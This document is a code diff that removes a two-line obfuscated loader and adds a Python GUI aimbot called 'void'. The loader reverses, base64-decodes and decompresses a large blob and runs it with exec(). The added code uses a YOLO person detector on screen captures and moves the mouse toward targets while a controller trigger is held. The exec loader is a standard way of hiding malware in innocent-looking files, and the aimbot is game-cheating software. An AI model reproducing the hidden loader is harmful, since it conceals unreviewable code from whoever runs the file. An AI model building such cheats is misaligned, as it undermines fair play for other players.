@@ -1,2 +1,213 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
-exec((_)(b'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'))
+from ultralytics import YOLO
+import bettercam
+import numpy as np
+import ctypes
+import torch
+import pygame
+import os
+import customtkinter as ctk
+from PIL import Image, ImageTk
+from tkinter import filedialog
+import threading
+import time
+
+root = ctk.CTk()
+root.geometry("957x538")
+root.title("void")
+root.resizable(False, False)
+bg_image = Image.open(r"C:\\v\\gui.png")  
+bg_image = bg_image.resize((957, 538))   
+bg_photo = ImageTk.PhotoImage(bg_image)
+
+bg_label = ctk.CTkLabel(root, image=bg_photo, text="")
+bg_label.place(x=0, y=0, relwidth=1, relheight=1) 
+
+
+def openai():
+    fp = filedialog.askopenfilename(title="open ai custom .pt file", filetypes=[("",".engine")])
+    if fp:
+        global ai
+        ai = fp 
+
+
+def verify_files():
+    pass
+
+def default_ai():   
+    global ai
+    ai = r"C:\v\best.engine"
+
+default_ai()
+
+button = ctk.CTkButton(root, text="Verify Files",
+                       fg_color="#000000",
+                       bg_color="#000000",
+                       hover_color="#000000",
+                       font=("Arial",17),
+                       command=verify_files,
+                       width=70,     
+                                    
+                       )
+default = ctk.CTkButton(root, text="Use default ai",
+                       fg_color="#000000",
+                       hover_color="#000000",
+                       command=default_ai,
+                       bg_color="#000000",
+                       font=("Arial",15),
+                       width=70,
+                       
+                       
+                                             )
+
+
+
+
+button.place(x=26, y=74)
+
+default.place(x=23, y=147)
+
+
+icon = ctk.CTkImage(
+    Image.open(r"C:\\v\folder.png"),
+    size=(18, 20)
+)
+
+
+
+files = ctk.CTkButton(
+    bg_label,          
+    text="",
+    image=icon,
+    fg_color="#000000",
+    hover_color="#000000",
+    command=openai,
+    border_width=0,
+    corner_radius=1,
+    width=35,
+    height=20,
+)
+
+files.place(x=16, y=495)
+
+ico = ctk.CTkImage(
+    Image.open(r"C:\\v\\save.png"),
+    size=(18, 20)
+)
+
+save = ctk.CTkButton(
+    bg_label,          
+    text="",
+    image=ico,
+    fg_color="#000000",
+    hover_color="#000000",
+    command=openai,
+    border_width=0,
+    corner_radius=1,
+    width=30,
+    height=20,
+)
+
+save.place(x=907, y=495)
+
+conf_value = ctk.DoubleVar(value=0.3)
+
+value1 = ctk.CTkRadioButton(root,text="", variable=conf_value, value=0.3,hover_color="#D400FF", font=("Arial",20), bg_color="#000000", text_color="#FFFFFF",fg_color="#3700FF", width=0)
+
+value2 = ctk.CTkRadioButton(root,text="", variable=conf_value, value=0.4,hover_color="#D400FF",font=("Arial",20),bg_color="#000000", text_color="#FFFFFF",fg_color="#3700FF",width=0)
+
+value3 = ctk.CTkRadioButton(root,text="", variable=conf_value, value=0.6, hover_color="#D400FF",font=("Arial",20),bg_color="#000000", text_color="#FFFFFF",fg_color="#3700FF",width=0)
+
+value1.place(x=370, y=141)  
+value2.place(x=370, y=265)  
+value3.place(x=370, y=395)  
+
+check_ai = ctk.CTkLabel(root, text="", fg_color="#000000", font=("arial", 15, "bold"), bg_color="#000000", text_color="#3700FF")
+
+def own():
+ cha = r"C:\v\best.engine"
+ if ai == cha:
+    check_ai.configure(text="Running default ai")
+    check_ai.place(x=15, y=215)
+ else:
+    check_ai.configure(text="Running custom ai")
+    check_ai.place(x=15, y=215)
+ root.after(100,own)
+own()
+
+
+pygame.init()
+pygame.joystick.init()
+axis = pygame.joystick.Joystick(0)
+axis.init()
+
+os.system("cls")
+
+mouse_event = ctypes.windll.user32.mouse_event
+
+CAPTURE_SIZE = 192
+FULL_CENTER_X = 960
+FULL_CENTER_Y = 540
+REL_CENTER_X = CAPTURE_SIZE
+REL_CENTER_Y = CAPTURE_SIZE
+VERTICAL_AIM_FACTOR = 0.25
+
+REGION = (
+    FULL_CENTER_X - REL_CENTER_X,
+    FULL_CENTER_Y - REL_CENTER_Y,
+    FULL_CENTER_X + REL_CENTER_X,
+    FULL_CENTER_Y + REL_CENTER_Y,
+)
+
+CAMERA = bettercam.create(
+    output_idx=0,
+    output_color="BGR",
+    region=REGION
+)
+
+
+def main():
+    ca = ai
+    model = YOLO(rf"{ca}")
+
+    while True:
+        if ca != ai:
+         ca = ai
+         model = YOLO(rf"{ca}")
+
+        frame = CAMERA.grab()
+        if frame is None or frame.size == 0:
+            continue
+
+        img = np.ascontiguousarray(frame)
+        with torch.inference_mode():
+         results = model(
+            img,
+            classes=[0],
+            conf=conf_value.get(),
+            device=0,
+            verbose=False,
+            half=True,
+        )
+
+        if not results or not len(results[0].boxes):
+            continue
+
+        boxes = results[0].boxes.xyxy
+        if torch.is_tensor(boxes):
+            boxes = boxes.cpu().numpy()
+
+        x1, y1, x2, y2 = boxes[0]
+        cx = (x1 + x2) / 2
+        h = y2 - y1
+        cy = y1 + h * VERTICAL_AIM_FACTOR
+
+        dx = int(cx - REL_CENTER_X)
+        dy = int(cy - REL_CENTER_Y)
+
+        pygame.event.pump()
+        if axis.get_axis(4) > 0.0:
+            mouse_event(0x0001, (dx * 3), (dy * 3))
+if __name__ == '__main__':
+ threading.Thread(target=main, daemon=True).start()
+ root.iconbitmap(r"C:\v\logo.ico")
+ root.mainloop()
